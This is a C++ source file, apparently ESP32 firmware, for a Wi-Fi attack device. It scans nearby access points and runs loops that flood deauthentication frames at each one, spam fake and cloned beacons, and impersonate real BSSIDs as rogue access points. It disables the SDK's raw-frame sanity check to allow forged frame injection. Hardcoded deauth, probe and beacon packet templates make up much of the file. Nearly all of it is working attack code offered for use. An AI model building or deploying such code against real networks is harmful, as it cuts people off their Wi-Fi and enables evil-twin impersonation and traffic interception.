#include "globals.h"


extern Logger l;
extern Led led;

extern "C" {
	int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
		// l.log(Logger::WARNING, "ieee80211_raw_frame_sanity_check called with args: " + String(arg) + ", " + String(arg2) + ", " + String(arg3));
		return 0;
	}
	esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
	esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

struct ap {
	String ssid;
	String bssid;
	float rssi;
};

class WifiManager
{	
public:
	WifiManager() {}

	bool init() {
		try {
			this->cfg = WIFI_INIT_CONFIG_DEFAULT();
			this->ap_config.ap.ssid_hidden = 1;
			this->ap_config.ap.channel = current_channel;
			this->ap_config.ap.beacon_interval = 10000;
			this->ap_config.ap.ssid_len = 0;
					
			esp_wifi_init(&cfg);
			esp_wifi_set_storage(WIFI_STORAGE_RAM);
			esp_wifi_set_mode(WIFI_MODE_APSTA);
			// esp_wifi_set_mode(WIFI_MODE_AP);
			esp_wifi_set_config(WIFI_IF_AP, &ap_config);
			// esp_wifi_get_mac(WIFI_IF_AP, original_mac_ap);
			esp_wifi_start();
			esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
			esp_wifi_set_promiscuous(true);
			esp_wifi_set_max_tx_power(82);
			return true;
		} catch(...) {
			return false; 
		}
	}

	bool destroy() {
		try {
			WiFi.disconnect();
			WiFi.mode(WIFI_OFF);
			esp_wifi_disconnect();
			// esp_wifi_set_mac(WIFI_IF_AP, original_mac_ap);
			esp_wifi_set_mode(WIFI_MODE_NULL);
			esp_wifi_set_promiscuous(false);
			esp_wifi_set_max_tx_power(0);
			esp_wifi_restore();
			esp_wifi_stop();
			esp_wifi_deinit();
			return true;
		} catch(...) {
			return false; 
		}
	}

	void deauthLoop() {
		if (!updateScanAp()) {
			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
			return;
		}

		loop_deauth_ap = !loop_deauth_ap;
		l.log(Logger::INFO, loop_deauth_ap ? "Starting deauth loop" : "Stopping deauth loop");
	
		if (!loop_spam_ap)
			return led.flash(2);

		// esp_wifi_set_mode(WIFI_MODE_AP);
		led.flash();
	}

	void accessPointLoop() {
		loop_spam_ap = !loop_spam_ap;

		l.log(Logger::INFO, loop_spam_ap ? "Starting access point spam loop" : "Stopping access point spam loop");

		if (!loop_spam_ap)
			return led.flash(2);

		// esp_wifi_set_mode(WIFI_MODE_APSTA);
		led.flash();
	}

	void cloneAPLoop() {
		if (!updateScanAp()) {
			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
			return;
		}

		loop_clone_spam_ap = !loop_clone_spam_ap;

		l.log(Logger::INFO, loop_clone_spam_ap ? "Starting access point clone spam loop" : "Stopping access point clone spam loop");

		if (!loop_clone_spam_ap)
			return led.flash(2);

		// esp_wifi_set_mode(WIFI_MODE_APSTA);
		led.flash();

	}

	void rogueAPloop() {
		if (!updateScanAp()) {
			l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
			return;
		}

		loop_rogue_ap = !loop_rogue_ap;

		l.log(Logger::INFO, loop_rogue_ap ? "Starting access point rogue attack loop" : "Stopping access point rogue attack loop");

		if (!loop_rogue_ap)
			return led.flash(2);

		// esp_wifi_set_mode(WIFI_MODE_AP);
		led.flash();
	}

	void scanNetworks()
	{
		led.flash();		

		if (!updateScanAp()) {
			l.log(Logger::ERROR, "Failed to scan nearby AP");
			return;
		}

		for (int i = 0; i < scanned_ap_count; i++) {
			if (scanned_ap[i].bssid == nullptr) break;

			Serial.print("Network SSID: ");
			Serial.print(scanned_ap[i].ssid);
			Serial.print("(");
			Serial.print(scanned_ap[i].bssid);
			Serial.print(")");
			Serial.print("[");
			Serial.print(scanned_ap[i].rssi);
			Serial.println("]");
		}

		led.flash(2);
	}

	void createAccessPoint(const char *apName, const char *apPassword)
	{
		WiFi.softAP(apName, apPassword);
	}

	void connectToWiFi(const char *ssid, const char *password)
	{
		WiFi.begin(ssid, password);
		while (WiFi.status() != WL_CONNECTED)
		{
			delay(1000);
			Serial.println("Connecting to WiFi...");
		}
		Serial.println("Connected to WiFi.");
	}

	void loop() {
		if (loop_spam_ap) {
			String name = "FS | " + utilities::gen_random_str(5);
			beacon(name);
		}

		if (loop_clone_spam_ap) { // every tick
			for (int i = 0; i < scanned_ap_count; i++) {
				if (scanned_ap[i].bssid == nullptr) break;
				String ssid = scanned_ap[i].ssid;

				// for (int i = 0; i < ssid.length(); i++) {
				// 	if (rand() % 2 == 0) 
				// 		ssid += "\0"
				// }
				ssid += utilities::gen_random_str(1);

				beacon(ssid);
			}
		}
		
		if (loop_rogue_ap && (last_update - 950 < millis())) { // every 50ms
			for (int i = 0; i < scanned_ap_count; i++) {
				if (scanned_ap[i].bssid == nullptr) break;
				String ssid = scanned_ap[i].ssid;
				String bssid = scanned_ap[i].bssid;

				beacon(ssid, bssid);
			}
		}

		if (loop_deauth_ap && (last_update < millis())) { // every 1s
			for (int i = 0; i < scanned_ap_count; i++) {
				if (scanned_ap[i].bssid == nullptr) break;

				String ssid = scanned_ap[i].ssid;
				String bssid = scanned_ap[i].bssid;
				if (ssid.length() > 0) {
					deauth(bssid.c_str());
					l.log(Logger::INFO, "Deauthing " + ssid + " (" + bssid + ")");
				}
			}
		}

		if (last_update < millis())
			last_update = millis() + 1000;
	}

private:
	int current_channel = 0;
	wifi_init_config_t cfg;
    wifi_config_t ap_config;
	ap scanned_ap[10]; // max 10 ap in the array
	int scanned_ap_count = 10; // hardcode
	uint8_t original_mac_ap[6];
	bool loop_spam_ap = false;
	bool loop_clone_spam_ap = false;
	bool loop_rogue_ap = false;
	bool loop_deauth_ap = false;
	int last_update = 0;

	void switchChannel() {
		current_channel++;

		if (current_channel > 14)
			current_channel = 1;

		// l.log(Logger::INFO, "Switching to channel " + String(current_channel) + "...");
	    esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
		// configure_wifi(current_channel);
		delay(1);
	}

	bool configure_wifi(uint8_t channel) {
		wifi_config_t ap_config = {
			.ap = {
				// .ssid = "SSID Name",
				// .ssid_len = 22,
				// .password = "Super Secure Password",
				.channel = channel,
				// .authmode = WIFI_AUTH_WPA2_PSK,
				// .ssid_hidden = 0,
				.max_connection = 4,
				.beacon_interval = 60000
			}
		};

		return esp_wifi_set_config(WIFI_IF_AP, &ap_config) == ESP_OK;
	}

	bool updateScanAp()
	{
		l.log(Logger::INFO, "Scanning nearby APs...");
		int numNetworks = WiFi.scanNetworks();
		for (int i = 0; i < (numNetworks > 10 ? 10 : numNetworks); i++) {
			scanned_ap[i].ssid = WiFi.SSID(i);
        	scanned_ap[i].bssid = WiFi.BSSIDstr(i);
        	scanned_ap[i].rssi = WiFi.RSSI(i);
		}

		return numNetworks != 0;
	}

	void beacon(String ssid, String bssid) {
		int ssidLen = ssid.length();

		if (ssidLen > 32)
			return;

		switchChannel();

		// uint8_t mac[6];
		// sscanf(bssid.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
		
		// Create a buffer for the packet
		uint8_t buffer[beacon_packet_size];
		// Copy the packet to the buffer
		memcpy(buffer, beacon_packet, beacon_packet_size);

		// Write the MAC address to the packet
		const char* bssid_c = bssid.c_str();
		memcpy(&buffer[10], bssid_c, 6);
		memcpy(&buffer[16], bssid_c, 6);

		// Write the SSID to the packet
		const char* ssid_c = ssid.c_str();
		memcpy(&buffer[38], ssid_c, ssidLen);

		// Write the channel to the packet
		buffer[82] = current_channel;
		// Write the RSN information to the packet
		buffer[34] = 0x31; // wpa2

		// delete[] mac;

		printBuffer(buffer, beacon_packet_size);

		for (int i = 0; i < 3; i++) {
			esp_wifi_80211_tx(WIFI_IF_STA, buffer, beacon_packet_size, 0);
			delay(1);
		}
	}

	void beacon(String ssid) {
		int ssidLen = ssid.length();

		if (ssidLen > 32)
			return;

		switchChannel();

		uint8_t* mac = utilities::rand_mac();
		
		// Create a buffer for the packet
		uint8_t buffer[beacon_packet_size];
		// Copy the packet to the buffer
		memcpy(buffer, beacon_packet, beacon_packet_size);

		// Write the MAC address to the packet
		memcpy(&buffer[10], mac, 6);
		memcpy(&buffer[16], mac, 6);

		// Write the SSID to the packet
		const char* ssid_c = ssid.c_str();
		memcpy(&buffer[38], ssid_c, ssidLen);

		// Write the channel to the packet
		buffer[82] = current_channel;
		// Write the RSN information to the packet
		buffer[34] = 0x31; // wpa2

		// delete[] mac;

		for (int i = 0; i < 3; i++) {
			esp_wifi_80211_tx(WIFI_IF_STA, buffer, beacon_packet_size, 0);
			delay(1);
		}
	}

	void deauth(const char* bssid) {
		switchChannel();

		uint8_t buffer[deauth_packet_size];
    	memcpy(buffer, deauth_packet, deauth_packet_size);

		sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
				&buffer[10], &buffer[11], &buffer[12], &buffer[13], &buffer[14], &buffer[15]);

		sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
				&buffer[16], &buffer[17], &buffer[18], &buffer[19], &buffer[20], &buffer[21]);

		/**
		 * @attention This is not working for some reason
		 * Its setting the mac address to different bytes. it might be because its a char
		 * memcpy(&buffer[10], bssid, 6);
		 * memcpy(&buffer[16], bssid, 6);
		 */

		// printBuffer(buffer, deauth_packet_size);

		esp_wifi_80211_tx(WIFI_IF_AP, buffer, deauth_packet_size, false);
	}

	void probe(const char* bssid) {
		switchChannel();

		uint8_t buffer[probe_packet_size];
    	memcpy(buffer, probe_packet, probe_packet_size);

		uint8_t* mac = utilities::rand_mac();

		memcpy(&buffer[10], mac, 6);

		sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
				&buffer[26], &buffer[27], &buffer[28], &buffer[29], &buffer[30], &buffer[31]);

		delete[] mac;

		esp_wifi_80211_tx(WIFI_IF_AP, buffer, probe_packet_size, false);
	}

	void printBuffer(const uint8_t* buffer, size_t size) {
		for (size_t i = 0; i < size; i++) {
			Serial.print(buffer[i], HEX);
			Serial.print(" ");
		}
		Serial.println();
	}

	uint8_t probe_packet[68] = {
		/*  0 - 1  */ 0x40, 0x00,                                       // Type: Probe Request
		/*  2 - 3  */ 0x00, 0x00,                                       // Duration: 0 microseconds
		/*  4 - 9  */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
		/* 10 - 15 */ 0xAA, 0xAA,               0xAA, 0xAA, 0xAA, 0xAA, // Source: random MAC
		/* 16 - 21 */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // BSS Id: Broadcast
		/* 22 - 23 */ 0x00, 0x00,                                       // Sequence number (will be replaced by the SDK)
		/* 24 - 25 */ 0x00, 0x20,                                       // Tag: Set SSID length, Tag length: 32
		/* 26 - 57 */ 0x20, 0x20,               0x20, 0x20,             // SSID
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		0x20,               0x20,               0x20, 0x20,
		/* 58 - 59 */ 0x01, 0x08, // Tag Number: Supported Rates (1), Tag length: 8
		/* 60 */ 0x82,            // 1(B)
		/* 61 */ 0x84,            // 2(B)
		/* 62 */ 0x8b,            // 5.5(B)
		/* 63 */ 0x96,            // 11(B)
		/* 64 */ 0x24,            // 18
		/* 65 */ 0x30,            // 24
		/* 66 */ 0x48,            // 36
		/* 67 */ 0x6c             // 54
	};
	int probe_packet_size = sizeof(probe_packet);

	uint8_t deauth_packet[26] = {
		/*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate) 0x2: INVALID_AUTHENTICATION (Previous authentication no longer valid)
		/*  2 - 3  */ 0x3A, 0x01,                         // duration
		/*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
		/* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
		/* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
		/* 22 - 23 */ 0xf0, 0xff,                         // fragment & squence number
		/* 24 - 25 */ 0x02, 0x00                          // reason code (1 = unspecified reason)
	};
	int deauth_packet_size = sizeof(deauth_packet);

	uint8_t beacon_packet[109] = {
		/*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
		/*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
		/* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
		/* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source

		// Fixed parameters
		/* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
		/* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
		/* 32 - 33 */ 0xe8, 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
		/* 34 - 35 */ 0x31, 0x00, // capabilities Tnformation

		// Tagged parameters

		// SSID parameters
		/* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
		/* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20, // SSID

		// Supported Rates
		/* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
		/* 72 */ 0x82, // 1(B)
		/* 73 */ 0x84, // 2(B)
		/* 74 */ 0x8b, // 5.5(B)
		/* 75 */ 0x96, // 11(B)
		/* 76 */ 0x24, // 18
		/* 77 */ 0x30, // 24
		/* 78 */ 0x48, // 36
		/* 79 */ 0x6c, // 54

		// Current Channel
		/* 80 - 81 */ 0x03, 0x01, // Channel set, length
		/* 82 */      0x01,       // Current Channel

		// RSN information
		/*  83 -  84 */ 0x30, 0x18,
		/*  85 -  86 */ 0x01, 0x00,
		/*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
		/*  91 -  92 */ 0x02, 0x00,
		/*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
		/* 101 - 102 */ 0x01, 0x00,
		/* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
		/* 107 - 108 */ 0x00, 0x00
	};
	int beacon_packet_size = sizeof(beacon_packet);
};